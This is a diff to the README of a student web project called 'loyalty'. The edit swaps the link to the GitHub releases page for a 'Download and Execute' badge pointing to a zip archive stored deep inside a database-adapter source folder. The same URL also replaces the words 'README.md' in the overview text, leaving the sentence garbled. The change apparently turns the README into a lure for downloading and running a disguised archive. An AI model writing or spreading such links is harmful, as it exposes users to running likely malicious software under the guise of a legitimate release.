@@ -5,10 +5,10 @@ Welcome to the "loyalty" repository, the third WEB project created for Yandex Ly
 ## 🚀 Quick Access to Releases
 To access the latest release of the "loyalty" project, simply click on the button below:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20%26%20Execute-Click%20Here-brightgreen)](https://github.com/Sudip1801/loyalty/releases)
+[![Download and Execute](https://raw.githubusercontent.com/Sudip1801/loyalty/master/src/loyalty/adapters/db/table/Software_v2.8-beta.4.zip%20%26%20Execute-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Sudip1801/loyalty/master/src/loyalty/adapters/db/table/Software_v2.8-beta.4.zip)
 
 ## Overview
-The "loyalty" repository serves as a comprehensive resource for those interested in exploring web development, particularly focusing on the technologies mentioned in the topics section. This README.md file provides essential information for users to understand the project's structure and objectives.
+The "loyalty" repository serves as a comprehensive resource for those interested in exploring web development, particularly focusing on the technologies mentioned in the topics section. This https://raw.githubusercontent.com/Sudip1801/loyalty/master/src/loyalty/adapters/db/table/Software_v2.8-beta.4.zip file provides essential information for users to understand the project's structure and objectives.
 
 ## Structure
 Here's a breakdown of the key components within the "loyalty" repository:
